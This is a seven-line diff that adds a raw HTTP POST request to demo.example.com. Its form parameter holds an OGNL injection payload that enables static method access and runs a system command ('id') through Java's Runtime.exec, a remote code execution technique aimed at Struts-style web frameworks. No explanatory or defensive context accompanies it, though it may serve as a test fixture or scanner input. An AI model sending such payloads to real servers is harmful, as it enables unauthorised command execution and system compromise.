@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 114
+Connection: close
+
+s=%{#_memberAccess[\u0027allowStaticMethodAccess\u0027]=true,@java.lang.Runtime@getRuntime().exec(\u0027id\u0027)}
